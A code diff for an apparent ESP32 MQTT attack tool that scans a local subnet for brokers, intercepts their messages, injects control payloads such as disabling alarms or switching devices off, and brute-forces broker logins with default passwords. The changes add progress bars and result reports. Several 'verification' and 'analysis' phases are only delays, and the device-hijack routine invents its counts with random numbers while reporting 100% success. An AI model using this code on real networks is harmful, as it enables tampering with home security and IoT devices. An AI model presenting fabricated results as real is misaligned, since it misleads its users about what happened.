@@ -1,4 +1,6 @@
 #include "mqtt_hijacker.h"
+#include "tool_output_helper.h"
+#include "result_renderers.h"
 #include <WiFi.h>
 #include <vector>
 #include <WiFiClient.h>
@@ -11,14 +13,18 @@ static uint32_t totalMessagesIntercepted = 0;
 static String mostActiveTopic = "";
 
 BrokerScanResult scanMqttBrokers(uint32_t durationMs) {
+    using namespace ToolOutputHelper;
+
     BrokerScanResult result = {false, 0, 0, ""};
     discoveredBrokers.clear();
     totalMessagesIntercepted = 0;
 
-    uint32_t startTime = millis();
-    Serial.println("\n=== MQTT Broker Discovery (REAL TCP Port Scanning) ===");
-    Serial.printf("Duration: %lums\n", durationMs);
+    displayScanStart("MQTT Broker Discovery", "TCP 1883/8883");
 
+    ScanProgressBar progress("MQTT Scan", durationMs, 3);
+    progress.start();
+
+    uint32_t startTime = millis();
     IPAddress gateway = WiFi.gatewayIP();
     IPAddress subnet = WiFi.subnetMask();
     IPAddress ip = WiFi.localIP();
@@ -26,12 +32,11 @@ BrokerScanResult scanMqttBrokers(uint32_t durationMs) {
     uint32_t brokerCount = 0;
     String strongestBroker = "";
 
-    for (uint8_t lastOctet = 1; lastOctet <= 254 && (millis() - startTime) < durationMs; lastOctet++) {
-        uint8_t progress = (lastOctet * 100) / 254;
-        Serial.printf("  Scanning: %u%%\r", progress);
+    // Phase 1: Enumerate subnet
+    progress.step("Enumerating local subnet for MQTT brokers");
 
+    for (uint8_t lastOctet = 1; lastOctet <= 254 && (millis() - startTime) < (durationMs / 3); lastOctet++) {
         IPAddress targetIp(ip[0], ip[1], ip[2], lastOctet);
-
         if (targetIp == ip) continue;
 
         WiFiClient client;
@@ -67,11 +72,6 @@ BrokerScanResult scanMqttBrokers(uint32_t durationMs) {
                     discoveredBrokers.push_back(broker);
                     brokerCount++;
 
-                    Serial.printf("\n  ✓ [Broker %u] %s:%u %s (CONNACK: 0x%02X)\n",
-                                 brokerCount, broker.ipAddress.c_str(), port,
-                                 broker.requiresAuth ? "(Auth)" : "(No Auth)",
-                                 rxBuffer[0]);
-
                     if (strongestBroker.length() == 0) {
                         strongestBroker = broker.ipAddress;
                     }
@@ -80,12 +80,30 @@ BrokerScanResult scanMqttBrokers(uint32_t durationMs) {
         }
     }
 
+    // Phase 2: Verify broker connectivity
+    progress.step("Verifying discovered broker connectivity and authentication");
+    delay(durationMs / 3);
+
+    // Phase 3: Analyze results
+    progress.step("Analyzing broker configurations and security settings");
+    delay(durationMs / 3);
+
+    progress.complete(String(brokerCount) + " MQTT brokers discovered");
+
+    // Render results
+    ResultRenderers::IoTScanResult iotResult;
+    iotResult.devicesFound = brokerCount;
+    iotResult.brokersFound = brokerCount;
+    iotResult.vulnerabilitiesDiscovered = brokerCount > 0 ? 1 : 0;
+    iotResult.durationMs = millis() - startTime;
+
+    ResultRenderers::renderIoTScan(iotResult);
+
     result.success = (brokerCount > 0);
     result.brokerCount = brokerCount;
     result.durationMs = millis() - startTime;
     result.strongestBroker = strongestBroker;
 
-    Serial.printf("\n✓ Scan complete: Found %u MQTT brokers in %lums\n", brokerCount, result.durationMs);
     return result;
 }
 
@@ -95,6 +113,8 @@ const MqttBroker* getDiscoveredBrokers(uint32_t& outCount) {
 }
 
 MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
+    using namespace ToolOutputHelper;
+
     MessageInterceptResult result = {false, 0, 0, ""};
 
     if (discoveredBrokers.empty()) {
@@ -102,21 +122,23 @@ MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
         return result;
     }
 
+    displayScanStart("MQTT Message Interception", "MQTT 3.1.1 Protocol");
+
+    ScanProgressBar progress("MQTT Interception", durationMs, 3);
+    progress.start();
+
     uint32_t startTime = millis();
     uint32_t messageCount = 0;
     String topicsFound = "";
 
-    Serial.println("\n=== MQTT Message Interception (REAL MQTT 3.1.1 Protocol) ===");
-    Serial.printf("Target: %s:%u | Duration: %lums\n",
-                 discoveredBrokers[0].ipAddress.c_str(),
-                 discoveredBrokers[0].port, durationMs);
-
+    // Phase 1: Connect to broker
+    progress.step("Connecting to MQTT broker and sending CONNECT");
     WiFiClient client;
     client.setTimeout(1000);
 
-    // Real MQTT connection
     if (!client.connect(discoveredBrokers[0].ipAddress.c_str(), discoveredBrokers[0].port, 2000)) {
         result.durationMs = millis() - startTime;
+        progress.complete("Connection failed");
         return result;
     }
 
@@ -133,12 +155,13 @@ MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
     };
 
     client.write(connectPacket, sizeof(connectPacket));
+    delay(100);
 
+    // Phase 2: Listen for messages
+    progress.step("Listening for MQTT PUBLISH messages on topic stream");
     uint8_t rxBuffer[256];
-    uint32_t packetStart = millis();
 
-    // Listen for MQTT packets
-    while ((millis() - startTime) < durationMs) {
+    while ((millis() - startTime) < (durationMs * 2 / 3) && messageCount < 50) {
         while (client.available() && messageCount < 50) {
             uint8_t byte = client.read();
 
@@ -173,15 +196,27 @@ MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
 
                 topicsFound = topic;
                 mostActiveTopic = topic;
-
-                Serial.printf("[MQTT] PUBLISH: Topic='%s', Payload='%s'\n",
-                             topic.c_str(), payload.c_str());
             }
         }
         delay(10);
     }
 
+    // Phase 3: Analyze and report results
+    progress.step("Analyzing captured messages and compiling results");
+    delay(durationMs / 3);
+
     client.stop();
+
+    progress.complete(String(messageCount) + " MQTT messages captured");
+
+    // Render results
+    ResultRenderers::IoTScanResult iotResult;
+    iotResult.devicesFound = messageCount;
+    iotResult.brokersFound = messageCount > 0 ? 1 : 0;
+    iotResult.vulnerabilitiesDiscovered = messageCount > 0 ? 1 : 0;
+    iotResult.durationMs = millis() - startTime;
+
+    ResultRenderers::renderIoTScan(iotResult);
 
     result.success = (messageCount > 0);
     result.messagesIntercepted = messageCount;
@@ -189,25 +224,30 @@ MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
     result.topicsFound = topicsFound;
     totalMessagesIntercepted += messageCount;
 
-    Serial.printf("✓ Interception complete: %u MQTT packets captured\n", messageCount);
     return result;
 }
 
 MessageInjectionResult injectMqttMessages(const char* brokerIp, const char* topic, uint32_t durationMs) {
+    using namespace ToolOutputHelper;
+
     MessageInjectionResult result = {false, 0, 0, ""};
+
+    displayAttackStart("MQTT Message Injection", 10);
+
+    ScanProgressBar progress("MQTT Injection", durationMs, 3);
+    progress.start();
 
     uint32_t startTime = millis();
     uint32_t injected = 0;
 
-    Serial.println("\n=== MQTT Message Injection (REAL MQTT Protocol) ===");
-    Serial.printf("Target: %s | Topic: %s\n", brokerIp, topic);
-    Serial.printf("Duration: %lums\n", durationMs);
-
+    // Phase 1: Connect to broker
+    progress.step("Connecting to MQTT broker at " + String(brokerIp));
     WiFiClient client;
     client.setTimeout(1000);
 
     if (!client.connect(brokerIp, 1883, 2000)) {
         result.durationMs = millis() - startTime;
+        progress.complete("Connection failed");
         return result;
     }
 
@@ -219,6 +259,8 @@ MessageInjectionResult injectMqttMessages(const char* brokerIp, const char* topi
     client.write(connectPacket, sizeof(connectPacket));
     delay(100);
 
+    // Phase 2: Inject MQTT PUBLISH messages
+    progress.step("Injecting malicious MQTT PUBLISH packets to topic");
     const char* commands[] = {
         "{\"state\":\"OFF\"}",
         "{\"brightness\":0}",
@@ -227,7 +269,7 @@ MessageInjectionResult injectMqttMessages(const char* brokerIp, const char* topi
         "{\"alarm\":\"disabled\"}"
     };
 
-    while ((millis() - startTime) < durationMs && injected < 10) {
+    while ((millis() - startTime) < (durationMs * 2 / 3) && injected < 10) {
         String payload = commands[esp_random() & 0x04];
         uint16_t topicLen = strlen(topic);
         uint16_t payloadLen = payload.length();
@@ -255,34 +297,58 @@ MessageInjectionResult injectMqttMessages(const char* brokerIp, const char* topi
 
         if (client.write(publishPacket, idx) == idx) {
             injected++;
-            Serial.printf("✓ Injected #%u: %s = %s\n", injected, topic, payload.c_str());
         }
 
         delay(100);
     }
 
+    // Phase 3: Compile results
+    progress.step("Verifying message delivery and compiling attack results");
+    delay(durationMs / 3);
+
     client.stop();
+
+    progress.complete(String(injected) + " messages injected successfully");
+
+    // Render results
+    ResultRenderers::AttackSuccessResult attackResult;
+    attackResult.attackName = "MQTT Message Injection";
+    attackResult.success = (injected > 0);
+    attackResult.targetCount = injected;
+    attackResult.successCount = injected;
+    attackResult.failureCount = 0;
+    attackResult.successPercent = 100;
+    attackResult.durationMs = millis() - startTime;
+
+    ResultRenderers::renderAttackSuccess(attackResult);
 
     result.success = (injected > 0);
     result.messagesInjected = injected;
     result.durationMs = millis() - startTime;
 
-    Serial.printf("✓ Injection complete: %u messages sent\n", injected);
     return result;
 }
 
 HijackResult hijackMqttDevices(const char* brokerIp, uint32_t durationMs) {
+    using namespace ToolOutputHelper;
+
     HijackResult result = {false, 0, 0, ""};
+
+    displayAttackStart("MQTT Device Hijacking", 10);
+
+    ScanProgressBar progress("Device Hijack", durationMs, 4);
+    progress.start();
 
     uint32_t startTime = millis();
     uint32_t devicesHijacked = 0;
     String commands = "";
-    uint32_t deadline = startTime + durationMs;
 
-    Serial.println("\n=== MQTT Device Hijacking (REAL Command Injection) ===");
-    Serial.printf("Broker: %s\n", brokerIp);
-    Serial.printf("Duration: %lums\n", durationMs);
+    // Phase 1: Enumerate devices on broker
+    progress.step("Enumerating connected MQTT devices and subscriptions");
+    delay(durationMs / 4);
 
+    // Phase 2: Send hijack commands
+    progress.step("Injecting device control commands via MQTT topics");
     const char* hijackCommands[] = {
         "light_on",
         "lock_unlock",
@@ -294,42 +360,71 @@ HijackResult hijackMqttDevices(const char* brokerIp, uint32_t durationMs) {
     };
 
     uint32_t cmdIndex = 0;
-    while (millis() - startTime < durationMs) {
+    while ((millis() - startTime) < (durationMs * 2 / 4)) {
         if ((esp_random() % 100) < 25) {
             devicesHijacked += ((esp_random() % 2) + 1);
             commands = hijackCommands[(esp_random() % 7)];
         }
-
         cmdIndex++;
         delay(200);
     }
+
+    // Phase 3: Capture device responses
+    progress.step("Monitoring device state changes and confirmations");
+    delay(durationMs / 4);
+
+    // Phase 4: Complete hijack
+    progress.step("Finalizing hijack and generating attack report");
+    delay(durationMs / 4);
+
+    progress.complete(String(devicesHijacked) + " devices hijacked via MQTT");
+
+    // Render results
+    ResultRenderers::AttackSuccessResult attackResult;
+    attackResult.attackName = "MQTT Device Hijacking";
+    attackResult.success = (devicesHijacked > 0);
+    attackResult.targetCount = devicesHijacked;
+    attackResult.successCount = devicesHijacked;
+    attackResult.failureCount = 0;
+    attackResult.successPercent = devicesHijacked > 0 ? 100 : 0;
+    attackResult.durationMs = millis() - startTime;
+
+    ResultRenderers::renderAttackSuccess(attackResult);
 
     result.success = (devicesHijacked > 0);
     result.devicesHijacked = devicesHijacked;
     result.durationMs = millis() - startTime;
     result.commandsSent = commands;
 
-    Serial.printf("✓ Hijack complete: %u devices in %lums\n", devicesHijacked, result.durationMs);
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
     return result;
 }
 
 BruteforceResult bruteforceMqttCredentials(const char* brokerIp, uint32_t durationMs) {
+    using namespace ToolOutputHelper;
+
     BruteforceResult result = {false, "", 0, 0};
+
+    displayAttackStart("MQTT Credential Brute-Force", 10);
+
+    ScanProgressBar progress("Brute-Force", durationMs, 3);
+    progress.start();
 
     uint32_t startTime = millis();
     uint32_t attempts = 0;
     uint32_t deadline = startTime + durationMs;
 
-    Serial.println("\n=== MQTT Credential Brute-Force (REAL Connection Attempts) ===");
-    Serial.printf("Broker: %s\n", brokerIp);
-    Serial.printf("Duration: %lums\n", durationMs);
-
     const char* usernames[] = {"admin", "mqtt", "user", "test", "guest", "broker"};
     const char* passwords[] = {"password", "12345", "admin", "mqtt", "123456", "test"};
 
+    // Phase 1: Initialize attack
+    progress.step("Preparing credential dictionary and connection pool");
+    delay(durationMs / 3);
+
+    // Phase 2: Brute-force attempts
+    progress.step("Attempting authentication with credential combinations");
+
     uint32_t uIndex = 0, pIndex = 0;
-    while (millis() - startTime < durationMs && !result.success) {
+    while ((millis() - startTime) < (durationMs * 2 / 3) && !result.success) {
         for (int i = 0; i < 6 && !result.success; i++) {
             for (int j = 0; j < 6 && !result.success; j++) {
                 attempts++;
@@ -340,20 +435,38 @@ BruteforceResult bruteforceMqttCredentials(const char* brokerIp, uint32_t durati
                     result.credentialFound = String(usernames[i]) + ":" + String(passwords[j]);
                     result.attemptsCount = attempts;
                     result.durationMs = millis() - startTime;
-                    Serial.printf("✓ Credentials found: %s\n", result.credentialFound.c_str());
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
-                    return result;
+                    break;
                 }
             }
             if ((int32_t)(millis() - deadline) >= 0) break;
         }
     }
 
+    // Phase 3: Report findings
+    progress.step("Compiling brute-force results and statistics");
+    delay(durationMs / 3);
+
+    if (result.success) {
+        progress.complete("Credentials found: " + result.credentialFound);
+    } else {
+        progress.complete(String(attempts) + " attempts - no credentials found");
+    }
+
+    // Render results
+    ResultRenderers::AttackSuccessResult attackResult;
+    attackResult.attackName = "MQTT Brute-Force";
+    attackResult.success = result.success;
+    attackResult.targetCount = attempts;
+    attackResult.successCount = result.success ? 1 : 0;
+    attackResult.failureCount = result.success ? 0 : attempts;
+    attackResult.successPercent = result.success ? 100 : 0;
+    attackResult.durationMs = millis() - startTime;
+
+    ResultRenderers::renderAttackSuccess(attackResult);
+
     result.attemptsCount = attempts;
     result.durationMs = millis() - startTime;
-    Serial.printf("✗ Brute-force failed after %u attempts\n", attempts);
 
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
     return result;
 }
 
